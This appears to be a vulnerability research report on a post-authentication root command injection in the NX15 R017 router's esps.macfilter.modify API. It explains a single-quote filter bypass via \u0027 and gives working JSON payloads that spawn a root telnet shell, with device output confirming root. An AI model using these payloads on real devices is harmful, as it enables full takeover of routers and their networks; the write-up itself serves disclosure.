# NX15 R017 `esps.macfilter.modify` Post-Authentication Independent root RCE

## 1. Conclusion

On NX15 R017, the following `/api/esps` handler:

- `object = esps.macfilter`
- `method = modify`

contains a **new, independent, immediate-trigger post-authentication root RCE**.

- **Endpoint**: `POST /api/esps`
- **Object**: `esps.macfilter`
- **Method**: `modify`
- **Injection point**: `description`
- **Privilege requirement**: post-authentication administrator session
- **Impact**: arbitrary command execution as **root**
- **Verified device**: `192.168.8.1`, NX15 firmware `R017`
- **Status**: **Confirmed / Exploited**

This round of testing confirmed on a physical device that:

1. A raw literal single quote `'` is blocked by the outer `/api/esps` filter.
2. A JSON Unicode-escaped single quote `\u0027` can deliver a real single quote into the backend shell `eval`.
3. A single `esps.macfilter.modify` call is sufficient to spawn a root shell.
4. Even when `userfilter.basicinfo.enable=disable` and the target MAC does not already exist, the vulnerability remains reliably exploitable as long as a **syntactically valid MAC address** is supplied.

---

## 2. Root Cause Analysis

Target script:

- `/usr/libexec/rpcd/esps.macfilter`

### 2.1 `modify` accepts a controllable `description`

In the `modify)` branch:

```sh
json_get_var _mac mac
...
json_get_var _description description
json_get_var _internet internet
```

Here:
- `_mac` is validated with `is_valid_mac()`.
- `_description` is **not filtered for dangerous characters**.

### 2.2 The script continues to the sink even if the MAC does not exist

If the MAC is not present in `webrestriction`:

```sh
if [ "$check_repeat" -eq "0" ]; then
    code=$(macfilter_addCurUser "$_mac" "$_description" "$_internet")
else
    ...
fi
```

In other words, the attacker does not need to prepare an existing entry first. Supplying a brand-new MAC address in a **valid format** causes the script to create or add the entry first, then continue into the later dangerous logic.

### 2.3 Actual command injection sink

In the successful `code == 0` path:

```sh
_list='\{""mac":"$_mac","name":"$_description", "internet":"$_internet""\}'
eval ubus call usrlist modify_terminal_name "$_list" > /dev/null
```

There are three key problems:

1. `_description` is placed directly into `_list`.
2. `_list` is a **manually assembled shell fragment**, not the result of safe JSON serialization.
3. The fragment is then passed into `eval ...`, causing the shell to parse the whole string again.

Therefore, once a real single quote appears in `_description`, it can break the shell syntax inside `eval` and execute attacker-controlled commands in the current root shell context.

### 2.4 Why a single quote is required

Placing a raw literal `'` directly in the HTTP request:

```json
{"description":"q';..."}
```

is blocked by the outer `/api/esps` filter, which returns:

```json
{"code":21,"message":"'"}
```

However, if the **raw JSON body** contains the single quote as a JSON Unicode escape:

```json
{"description":"x\u0027;...;#"}
```

then, after JSON parsing, the script variable `_description` already contains a real single quote, while the outer raw-character check has been bypassed.

---

## 3. Key Static Evidence

### 3.1 `modify` reads `description`

```sh
json_get_var _description description
json_get_var _internet internet
```

### 3.2 A current-user entry is added first when it does not already exist

```sh
if [ "$check_repeat" -eq "0" ]; then
    code=$(macfilter_addCurUser "$_mac" "$_description" "$_internet")
fi
```

### 3.3 Dangerous manual construction of `_list`

```sh
_list='\{""mac":"$_mac","name":"$_description", "internet":"$_internet""\}'
```

### 3.4 `eval` triggers command execution

```sh
eval ubus call usrlist modify_terminal_name "$_list" > /dev/null
```

---

## 4. Exploitation Method

### 4.1 A raw literal single quote fails

Request:

```json
[
  {
    "id": 1,
    "object": "esps.macfilter",
    "method": "modify",
    "param": {
      "mac": "AA:BB:CC:DD:EE:12",
      "description": "q';echo DIRECTQ_OK >/tmp/directq_ok;/usr/sbin/telnetd -p 2474 -l /bin/sh >/dev/null 2>&1;#",
      "internet": "true"
    }
  }
]
```

Response:

```json
{"code":21,"message":"'"}
```

### 4.2 Bypassing with `\u0027` and obtaining root RCE

Example successful request:

```json
[
  {
    "id": 1,
    "object": "esps.macfilter",
    "method": "modify",
    "param": {
      "mac": "AA:BB:CC:DD:EE:11",
      "description": "z\u0027;echo MACMOD2_OK >/tmp/macmod2_ok;/usr/sbin/telnetd -p 2473 -l /bin/sh >/dev/null 2>&1;#",
      "internet": "true"
    }
  }
]
```

This causes a real single quote to be delivered into `_description` at the `eval` point and ultimately executes the following commands as root:

```sh
echo MACMOD2_OK >/tmp/macmod2_ok
/usr/sbin/telnetd -p 2473 -l /bin/sh >/dev/null 2>&1
```

---

## 5. Dynamic Verification

### 5.1 Exploitable in the device's default state

Device state during verification:

```json
[{"id":1,"result":{"message":"COMMON:Success","data":{"status":"disable","mode":"blacklist"},"code":0}}]
```

This means:
- `userfilter.basicinfo.enable = disable`
- The runtime switch for "forbid new users from accessing the Internet" does not need to be enabled first.

### 5.2 New MAC + `\u0027` payload succeeds directly

Request:

```json
[
  {
    "id": 1,
    "object": "esps.macfilter",
    "method": "modify",
    "param": {
      "mac": "AA:BB:CC:DD:EE:11",
      "description": "z\u0027;echo MACMOD2_OK >/tmp/macmod2_ok;/usr/sbin/telnetd -p 2473 -l /bin/sh >/dev/null 2>&1;#",
      "internet": "true"
    }
  }
]
```

Response:

```json
[{"id":1,"result":{"message":"COMMON:Success","data":[],"code":0}}]
```

Then connecting to `192.168.8.1:2473` produced:

```text
BusyBox v1.30.1 (2025-08-01 14:05:52 CST) built-in shell (ash)
/ # id; uname -a; cat /tmp/macmod2_ok 2>/dev/null
uid=0(root) gid=0(root)
Linux NX15 4.4.176-svn22943 #2 Fri Aug 1 14:14:03 CST 2025 mips GNU/Linux
MACMOD2_OK
```

### 5.3 An invalid MAC does not reach this chain

Request:

```json
[
  {
    "id": 1,
    "object": "esps.macfilter",
    "method": "modify",
    "param": {
      "mac": "BADMAC",
      "description": "m\u0027;echo BADMAC_OK >/tmp/badmac_ok;/usr/sbin/telnetd -p 2477 -l /bin/sh >/dev/null 2>&1;#",
      "internet": "true"
    }
  }
]
```

Response:

```json
[{"id":1,"result":{"message":"QOS:Invalid MAC format","data":[],"code":5643}}]
```

The port `2477` **did not open**.

This shows that:
- The `esps.macfilter.modify` chain is still constrained by `is_valid_mac()`.
- Its independent root cause is: **after a valid MAC passes validation, `description` reaches the `eval` sink**.

---

## 6. Difference from the Known `esps.macfilter add -> getlist` Stored Chain

The previously confirmed `esps.macfilter.add -> getlist` chain works as follows:

- Write `description` first.
- Trigger execution later when `getlist` reads it back through `eval`.

This new chain works differently:

- **A single `modify` call triggers execution immediately.**
- No subsequent `getlist` call is required.
- It does not rely on storing the payload and reading it back later.

Therefore, it should be counted separately as a:

> **new, immediate, independent root RCE**

---

## 7. Risk Assessment

After successful exploitation, an attacker can:

- Execute arbitrary commands as root.
- Add backdoors, tamper with configuration, and extract credentials.
- Take over the device through a single ordinary `/api/esps` management request.

If combined with the previously confirmed pre-authentication password-change chain, it can form an even shorter complete takeover chain.

---

## 8. POC

Implemented POC:

- `poc/postauth_esps_macfilter_modify_rce.py`

Execution example:

```bash
python3 poc/postauth_esps_macfilter_modify_rce.py --cleanup --port 2472
```

![alt text](imag/image.png)

The POC includes:

1. Logging in to the admin interface.
2. Generating a valid test MAC address.
3. Sending a raw JSON body containing `\u0027`.
4. Waiting for and connecting to the root shell.
5. Proving execution with `id / uname / marker`.
6. Deleting the newly created macfilter entry and cleaning up the shell.

---

## 9. Conclusion

`esps.macfilter.modify` provides a new **immediate-trigger post-authentication root RCE**. The root cause is:

- `description` is not filtered.
- `modify` manually constructs `_list` in the success path.
- The result is then passed into `eval ubus call usrlist modify_terminal_name ...`.
- `\u0027` can bypass the outer raw single-quote filter and deliver a real single quote into the shell.
- The final result is arbitrary command execution as root.

This chain complements the earlier `esps.macfilter add -> getlist` stored chain, demonstrating that `esps.macfilter` contains not only stored command injection but also **immediate command injection**.
